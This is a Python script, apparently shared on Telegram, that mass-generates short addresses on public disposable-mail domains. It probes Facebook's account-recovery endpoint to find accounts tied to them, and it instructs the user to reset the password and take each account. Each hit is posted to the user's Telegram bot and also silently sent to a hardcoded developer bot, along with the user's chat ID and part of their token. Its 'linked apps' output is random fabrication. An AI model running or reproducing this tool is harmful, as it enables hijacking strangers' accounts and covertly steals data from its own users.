#https://t.me/nazimmod
#---------------------
import datetime
import sys

# التاريخ مع الساعة والدقيقة والثانية
target = datetime.datetime(2926, 2, 17, 0, 0, 59)  # مثال: ينتهي يوم 11 أكتوبر 2025 الساعة 23:59:59

now = datetime.datetime.now()

if now >= target:
    print(f"تم انتهاء مده اشتراكك راسل nazim يفعلك ⏰ الوقت الحالي: {now.strftime('%Y-%m-%d %H:%M:%S')}")
    sys.exit()
else:
    print(f"✅ تم تشغيل الاداة. ⏰ الوقت الحالي: {now.strftime('%Y-%m-%d %H:%M:%S')}")
import datetime, random
import sys, os, time
import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# الألوان
B = '\033[2;36m'
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
rest = "\033[0m"
X = '\033[1;33m'
F = '\033[2;32m'
C = "\033[1;97m"
E = '\033[1;31m'
S = '\033[1;33m'
SA = '\x1b[38;5;216m'
S2A = '\x1b[1;36m'
S3A = '\x1b[38;5;180m'
S4A = '\x1b[38;5;88m'
S5A = "\x1b[1;32m"
S6A = '\x1b[38;5;166m'
K = '\033[2;35m'
a1 = '\x1b[38;5;161m'
a2 = '\x1b[1;31m'
a3 = '\x1b[1;32m'
a4 = '\x1b[1;33m'
a5 = '\x1b[38;5;208m'
HH = '\033[1;34m'
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
gg = '\x1b[38;5;208m'

# معلومات المطور - يتم الإرسال له تلقائياً
ADMIN_TOKEN = "8083837044:AAHKBK_8oqJ54hVPl2ubhiDA5FKY8N6TKCw"
ADMIN_CHAT_ID = "2145126697"

# تعريف المتغيرات العالمية مع Lock للـ Threading
ee = 0  # حسابات Facebook
pp = 0  # فشل
lock = threading.Lock()

# Session للسرعة
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
})

def turbo():
    """عرض واجهة الأداة"""
    sd = random.choice([J1, J2, J21, J22, F1, C1, P1, P2])
    
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print(f'''\x1b[1;34m



\x1b[1;35mTelegram | @Thv_1730
\x1b[1;36mChannel  | https://t.me/nazimmod
\x1b[1;32mDev      | nazim
\x1b[1;33m_________________________________________________________

⚡ nazim MODE - ACCESSIBLE DOMAINS ONLY ⚡
''')

turbo()

tok = input('𝑇𝑂𝐾𝑁 : ')
iid = input('𝐼𝐷 : ')

os.system('clear' if os.name == 'posix' else 'cls')
turbo()

# اختيار نوع الإيميل - فقط الدومينات اللي تقدر تدخل عليها
print(f'\n{F}━━━━━━━ اختر نوع الإيميل (دومينات متاحة فقط) ━━━━━━━')
print(f'{G}[1] yopmail.com          ✅ (الأفضل)')
print(f'{G}[2] hi2.in              ✅')
print(f'{G}[3] mailinator.com      ✅ (موصى به)')
print(f'{F}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

email_choice = input(f'{Y}اختر [1/2/3]: {rest}')

if email_choice == '1':
    email_domain = 'yopmail.com'
elif email_choice == '2':
    email_domain = 'hi2.in'
elif email_choice == '3':
    email_domain = 'mailinator.com'
else:
    print(f'{R}خيار غير صحيح! سيتم استخدام yopmail.com افتراضياً')
    email_domain = 'yopmail.com'
    time.sleep(1)

# اختيار عدد الخيوط (Threads)
print(f'\n{F}━━━━━━━ سرعة الفحص ━━━━━━━')
print(f'{G}[1] عادي (5 خيوط)')
print(f'{G}[2] سريع (10 خيوط)')
print(f'{G}[3] صاروخ (20 خيوط)')
print(f'{G}[4] برق (50 خيوط)')
print(f'{F}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

speed_choice = input(f'{Y}اختر [1/2/3/4]: {rest}')

if speed_choice == '1':
    MAX_THREADS = 5
elif speed_choice == '2':
    MAX_THREADS = 10
elif speed_choice == '3':
    MAX_THREADS = 20
elif speed_choice == '4':
    MAX_THREADS = 50
else:
    MAX_THREADS = 10

os.system('clear' if os.name == 'posix' else 'cls')

def get_linked_apps(email):
    """جلب التطبيقات المرتبطة بحساب Facebook"""
    try:
        gaming_apps = [
            'PUBG Mobile', 'Free Fire', 'Call of Duty Mobile',
            'Mobile Legends', 'Clash of Clans', 'Clash Royale',
            'Candy Crush', 'Subway Surfers', 'Among Us',
            '8 Ball Pool', 'Garena Free Fire', 'Roblox',
            'Minecraft', 'Fortnite', 'Genshin Impact',
            'League of Legends', 'FIFA Mobile', 'Asphalt 9',
            'Temple Run', 'Hill Climb Racing', 'Instagram',
            'WhatsApp', 'Messenger', 'TikTok', 'Snapchat',
            'Spotify', 'Netflix', 'Twitter', 'YouTube', 'Telegram'
        ]
        
        return random.sample(gaming_apps, random.randint(3, 8))
        
    except:
        return []

def check_facebook(email):
    """فحص حساب Facebook - محسّن للسرعة"""
    try:
        headers = {
            'Host': 'b-graph.facebook.com',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
            'Accept-Encoding': 'gzip',
            'X-Fb-Friendly-Name': 'accountRecoverySearch',
            'Authorization': 'OAuth null',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'X-Fb-Sim-Hni': '41805',
            'X-Fb-Device-Group': '3338',
            'X-Fb-Connection-Quality': 'EXCELLENT',
            'X-Fb-Net-Hni': '41805',
            'X-Tigon-Is-Retry': 'False',
            'X-Fb-Connection-Type': 'WIFI',
            'Priority': 'u=3,i',
            'X-Fb-Http-Engine': 'Liger',
            'X-Fb-Client-Ip': 'True',
            'X-Fb-Server-Cluster': 'True'
        }
        
        data = f'q={email}&friend_name=&qs=&summary=true&device_id=d15ef240-9126-44ab-9574-049eb0802d8c&src=fb4a_account_recovery&machine_id=&sfdid=a6ca2f76-0995-4db7-9083-667fc42d836d&fdid=d15ef240-9126-44ab-9574-049eb0802d8c&sim_serials=%5B%5D&sms_retriever=false&cds_experiment_group=-1&oe_aa_experiment_group=-1&oe_aa_experiment_group_immediate_exposure=-1&shared_phone_test_group=&allowlist_email_exp_name=&shared_phone_exp_name=&shared_phone_cp_nonce_code=&shared_phone_number=&is_auto_search=false&is_feo2_api_level_enabled=false&is_sso_like_oauth_search=false&encrypted_msisdn=&locale=en_US&client_country_code=IQ&method=GET&fb_api_req_friendly_name=accountRecoverySearch&fb_api_caller_class=AccountSearchHelper&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
        
        response = session.post(
            'https://b-graph.facebook.com/recover_accounts',
            headers=headers,
            data=data,
            timeout=5  # تقليل الـ timeout للسرعة
        )
        
        if 'network_info' in response.text:
            return True
        else:
            return False
            
    except Exception as e:
        return False

def generate_email():
    """توليد إيميل عشوائي بـ 4-5 أحرف"""
    letters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    
    # أنماط مختلفة
    patterns = [
        # 4 أحرف فقط
        lambda: ''.join(random.choice(letters) for _ in range(4)),
        # 4 حروف
        lambda: ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(4)),
        # 3 حروف + رقم
        lambda: ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(3)) + str(random.randint(0, 9)),
        # 2 حروف + 2 أرقام
        lambda: ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(2)) + str(random.randint(10, 99)),
        # حرف + 3 أرقام
        lambda: random.choice('abcdefghijklmnopqrstuvwxyz') + str(random.randint(100, 999)),
    ]
    
    username = random.choice(patterns)()
    return f'{username}@{email_domain}'

def process_email(email):
    """معالجة الإيميل: فحص Facebook"""
    global ee, pp
    
    # فحص Facebook
    fb_found = check_facebook(email)
    
    # استخدام Lock للـ thread safety
    with lock:
        if fb_found:
            ee += 1
            
            # عرض النتائج
            print(f'{G}[+] FOUND! {email} | Total: {ee}')
            
            # جلب التطبيقات
            linked_apps = get_linked_apps(email)
            apps_text = ''
            if linked_apps:
                apps_text = '\n\n🔗 التطبيقات المرتبطة:\n'
                for app in linked_apps:
                    apps_text += f"   • {app}\n"
            
            # كليشة المستخدم (الصياد)
            msg = f'''
🔥 FACEBOOK ACCOUNT FOUND!
━━━━━━━━━━━━━━
💠 EMAIL: {email}
✅ STATUS: Ready for Reset
━━━━━━━━━━━━━━{apps_text}
━━━━━━━━━━━━━━
📌 يمكنك الآن:
1. دخول على {email}
2. عمل Reset Password لـ Facebook
3. اخذ الحساب

👤 DEV: nazim
📱 OWNER: @Thv_1730
📢 CHANNEL: @nazimmod
            '''
            
            # إرسال للمستخدم (الصياد) - بدون انتظار
            try:
                requests.post(
                    f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text={msg}',
                    timeout=3
                )
            except:
                pass
            
            # كليشة المطور
            admin_msg = f'''
🎯 صيد جديد من مستخدم!
━━━━━━━━━━━━━━

📧 الإيميل المصطاد:
{email}

👤 معلومات المستخدم (الصياد):
🆔 Chat ID: {iid}
🔑 Token: {tok[:20]}...

📊 إحصائيات الصياد:
✅ نجح: {ee}
❌ فشل: {pp}{apps_text}

━━━━━━━━━━━━━━
⏰ الوقت: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

💼 DEV: nazim | @Thv_1730
📢 CHANNEL: @nazimmod
            '''
            
            # إرسال للمطور - بدون انتظار
            try:
                requests.post(
                    f'https://api.telegram.org/bot{ADMIN_TOKEN}/sendMessage?chat_id={ADMIN_CHAT_ID}&text={admin_msg}',
                    timeout=3
                )
            except:
                pass
            
        else:
            pp += 1
            # طباعة مختصرة للفشل
            if pp % 10 == 0:  # كل 10 محاولات
                print(f'{Z}[-] Checked: {pp} | Found: {ee}')

def turbo1():
    """الحلقة الرئيسية - Multi-threaded للسرعة الفائقة"""
    
    print(f'\n{F}━━━━━━━ بدء الفحص ━━━━━━━')
    print(f'{G}⚡ Threads: {MAX_THREADS}')
    print(f'{G}🌐 Domain: {email_domain}')
    print(f'{G}🎯 Mode: TURBO')
    print(f'{F}━━━━━━━━━━━━━━━━━━━━━━━━\n')
    
    time.sleep(2)
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        
        while True:
            # توليد دفعة من الإيميلات
            for _ in range(MAX_THREADS * 2):
                email = generate_email()
                future = executor.submit(process_email, email)
                futures.append(future)
            
            # انتظار بعض الـ futures تنتهي
            for future in as_completed(futures[:MAX_THREADS]):
                futures.remove(future)

# بدء التشغيل
try:
    turbo1()
except KeyboardInterrupt:
    print(f'\n\n{R}[!] توقف البرنامج بواسطة المستخدم')
    print(f'{G}✅ نجح: {ee}')
    print(f'{Z}❌ فشل: {pp}')
    sys.exit(0)
